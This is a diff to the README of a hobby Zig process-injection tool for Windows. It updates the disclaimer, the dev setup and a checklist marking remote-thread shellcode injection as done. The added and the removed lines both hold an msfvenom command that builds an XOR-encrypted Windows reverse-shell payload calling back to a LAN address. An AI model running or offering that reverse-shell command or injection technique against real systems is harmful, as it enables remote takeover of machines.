@@ -1,11 +1,11 @@
 # ZInjector
 
-Simple Process injector for Windows and Linux written in Zig.
+Simple Process injector for Windows (for now) written in Zig.
 
 ## DISCLAIMER
 
-This is my first project in Zig. The goal is to learn Zig and perform process injection.
-I haven't decided what to implement yet, but the first steps are to learn Zig and implement simple DLL injection. Next, I will move on to a similar project for Linux, such as LD_PRELOAD hijacking or ptrace-based injection.
+This is my first project in Zig so the code is pretty mmmm rude(?). The goal is to learn Zig and perform process injection.
+I haven't decided what to implement yet, but the first steps are to learn Zig and implement simple process injection.
 
 ## Some cool resource for learning Zig and Process Injection
 
@@ -23,10 +23,10 @@ I haven't decided what to implement yet, but the first steps are to learn Zig an
 
 ## Dev
 
-- Zig Version: 0.15.1
+- Zig Version: 0.15.2
 - OS: Arch Linux
 - IDE: Zed
-- LSP: zls and clangd
+- LSP: Zls
 
 Deps for cross-compiler on linux:  mingw-w64-headers,mingw-w64-gcc
 
@@ -36,12 +36,12 @@ Deps for cross-compiler on linux:  mingw-w64-headers,mingw-w64-gcc
 - [x] Resolution of relative path to absolute path
 - [x] Search process by name
 - [x] Implement arguments parsing
-- [ ] Thread Hijacking
-  - [ ] Implement search by name also in Thread Hijacking
+- [x] Thread Remote creation with shellcode injection
+- [ ] SetWindowHookEx Code Injection
+- [ ] ...
 
 ## Command:
 
 - Compile: `zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall --summary all`
 - Test: `zig build test --summary all`
-- Shellcode generatore `msfvenom -p windows/shell_reverse_tcp LHOST=172.19.192.194 LPORT=8080 -f zig --encrypt xor --encrypt-key ciao
-`
+- Shellcode generator: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.118 LPORT=8080 -f zig --encrypt xor --encrypt-key a`
